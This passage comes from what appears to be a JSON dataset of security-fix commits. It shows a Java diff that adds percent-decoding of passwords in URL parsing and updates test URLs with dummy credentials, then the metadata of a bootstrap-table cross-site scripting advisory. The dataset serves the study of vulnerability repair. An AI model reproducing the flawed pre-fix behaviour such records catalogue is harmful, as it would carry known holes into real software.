local_pass;\n+\t\t\t\tStringBuilder new_local_pass = new StringBuilder();\n+\t\t\t\twhile (tmp_local_pass.contains(\"%\")) {\n+\t\t\t\t\tnew_local_pass.append(tmp_local_pass.substring(0, tmp_local_pass.indexOf('%')));\n+\t\t\t\t\ttmp_local_pass = tmp_local_pass.substring(tmp_local_pass.indexOf('%'));\n+\t\t\t\t\tif (tmp_local_pass.length() >= 3) {\n+\t\t\t\t\t\tchar c = (char) Integer.parseInt(tmp_local_pass.substring(1, 3), 16);\n+\t\t\t\t\t\tnew_local_pass.append(c);\n+\t\t\t\t\t\ttmp_local_pass = tmp_local_pass.substring(3);\n+\t\t\t\t\t}\n+\t\t\t\t\telse {\n+\t\t\t\t\t\tbreak;\n+\t\t\t\t\t}\n+\t\t\t\t}\n+\t\t\t\tif (!tmp_local_pass.isEmpty())\n+\t\t\t\t\tnew_local_pass.append(tmp_local_pass);\n+\t\t\t\tlocal_pass = new_local_pass.toString();\n+\t\t\t}\n \t\t}\n \t\tlocal_hostname = hostname;\n \t\tlocal_port = port;\n@@ -823,26 +845,26 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"ftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"ftp:\/\/user:pass%3Aa@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n \t\t}\n \t\tv.assertEquals(v.getProtocol(), \"ftp\");\n \t\tv.assertEquals(v.getUser(), \"user\");\n-\t\tv.assertEquals(v.getPassword(), \"pass:\");\n+\t\tv.assertEquals(v.getPassword(), \"pass:a\");\n \t\tv.assertEquals(v.getHostname(), \"machine\");\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"ftp:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"ftp:\/\/user:pass%3A%3a@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n \t\t}\n \t\tv.assertEquals(v.getProtocol(), \"ftp\");\n \t\tv.assertEquals(v.getUser(), \"user\");\n-\t\tv.assertEquals(v.getPassword(), \"pass:\");\n+\t\tv.assertEquals(v.getPassword(), \"pass::\");\n \t\tv.assertEquals(v.getHostname(), \"machine\");\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n@@ -992,7 +1014,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"FTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"FTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1004,7 +1026,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"FTP:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"FTP:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1161,7 +1183,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"sftp:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1173,7 +1195,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"sftp:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"sftp:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1185,7 +1207,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"sftp: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"sftp: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1197,7 +1219,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"sftp:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1209,7 +1231,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/ \/user:pass:@machine\";\n+\t\ts = \"sftp:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1221,7 +1243,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/\/user:pass:@:123\/a\";\n+\t\ts = \"sftp:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1233,7 +1255,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"sftp:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1329,7 +1351,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SFTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"SFTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1341,7 +1363,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"SFTP:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"SFTP:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1498,7 +1520,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"http:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1510,7 +1532,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"http:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"http:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1522,7 +1544,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"http: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"http: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1534,7 +1556,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"http:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1546,7 +1568,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/ \/user:pass:@machine\";\n+\t\ts = \"http:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1558,7 +1580,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/\/user:pass:@:123\/a\";\n+\t\ts = \"http:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1570,7 +1592,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"http:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1666,7 +1688,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"HTTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1678,7 +1700,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"HTTP:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"HTTP:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1690,7 +1712,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"HTTP: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"HTTP: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1702,7 +1724,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"HTTP:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1714,7 +1736,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/ \/user:pass:@machine\";\n+\t\ts = \"HTTP:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1726,7 +1748,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/\/user:pass:@:123\/a\";\n+\t\ts = \"HTTP:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1738,7 +1760,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"HTTP:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1835,7 +1857,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"https:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1847,7 +1869,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"https:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"https:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1859,7 +1881,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"https: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"https: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1871,7 +1893,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"https:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1883,7 +1905,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/ \/user:pass:@machine\";\n+\t\ts = \"https:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1895,7 +1917,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/\/user:pass:@:123\/a\";\n+\t\ts = \"https:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1907,7 +1929,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"https:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2003,7 +2025,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2015,7 +2037,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"HTTPS:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2027,7 +2049,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"HTTPS: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"HTTPS: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2039,7 +2061,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"HTTPS:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2051,7 +2073,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/ \/user:pass:@machine\";\n+\t\ts = \"HTTPS:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2063,7 +2085,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/\/user:pass:@:123\/a\";\n+\t\ts = \"HTTPS:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2075,7 +2097,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"HTTPS:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2172,7 +2194,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"webdav:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2184,13 +2206,13 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"webdav:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"webdav:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n \t\t}\n \n-\t\ts = \"webdav: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"webdav: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2202,7 +2224,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"webdav:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2214,7 +2236,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/ \/user:pass:@machine\";\n+\t\ts = \"webdav:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2226,7 +2248,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/\/user:pass:@:123\/a\";\n+\t\ts = \"webdav:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2238,7 +2260,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"webdav:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2334,7 +2356,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2346,7 +2368,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2358,7 +2380,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"WEBDAV: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"WEBDAV: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2370,7 +2392,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"WEBDAV:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2382,7 +2404,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/ \/user:pass:@machine\";\n+\t\ts = \"WEBDAV:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2394,7 +2416,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@:123\/a\";\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2406,7 +2428,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2503,7 +2525,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"smb:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2515,7 +2537,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"smb:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"smb:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2527,7 +2549,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"smb: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"smb: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2539,7 +2561,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"smb:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2551,7 +2573,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/ \/user:pass:@machine\";\n+\t\ts = \"smb:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2563,7 +2585,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/\/user:pass:@:123\/a\";\n+\t\ts = \"smb:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2575,7 +2597,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"smb:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2671,7 +2693,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"SMB:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2683,7 +2705,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"SMB:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"SMB:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2695,7 +2717,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"SMB: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"SMB: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2707,7 +2729,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"SMB:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2719,7 +2741,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/ \/user:pass:@machine\";\n+\t\ts = \"SMB:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2731,7 +2753,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/\/user:pass:@:123\/a\";\n+\t\ts = \"SMB:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2743,7 +2765,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"SMB:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);"
        },
        {
            "index":340,
            "vuln_id":"GHSA-grw5-g9h2-wpg8",
            "cwe_id":"{'CWE-79'}",
            "score":6.8,
            "chain":"{'https:\/\/github.com\/wenzhixin\/bootstrap-table\/commit\/b4a1e5dd332be652e0bc376fd9256886cf4bbde9'}",
            "dataset":"osv",
            "summary":"Cross-site Scripting in bootstrap-table Bootstrap Tables XSS vulnerability with Table Export plug-in when exportOptions: htmlContent is true in GitHub repository wenzhixin\/bootstrap-table prior to 1.20.2. Disclosing session cookies, disclosing secure session data, exfiltrating data to third-parties.",
            "published_date":"2022-05-17",
            "chain_len":1,
            "project":"https:\/\/github.com\/wenzhixin\/bootstrap-table",
            "commit_href":"https:\/\/github.com\/wenzhixin\/bootstrap-table\/commit\/b4a1e5dd332be652e0bc376fd9256886cf4bbde9",
            "commit_sha":"b4a1e5dd332be652e0bc376fd9256886cf4bbde9",
            "patch":"SINGLE",
            "chain_ord":"['b4a1e5dd332be652e0bc376fd9256886cf4bbde9']",
            "before_first_fix_commit":"{'55d3760df3d226ac1150d7ddcbfd0ff6bd1c53c2'}",
            "last_fix_commit":"b4a1e5dd332be652e0bc376fd9256886cf4bbde9",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/10\/2022, 02:59:07",
            "message":"Fixed XSS vulnerability bug by onCellHtmlData",
            "author":"zhixin",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 16, 'total': 20}",
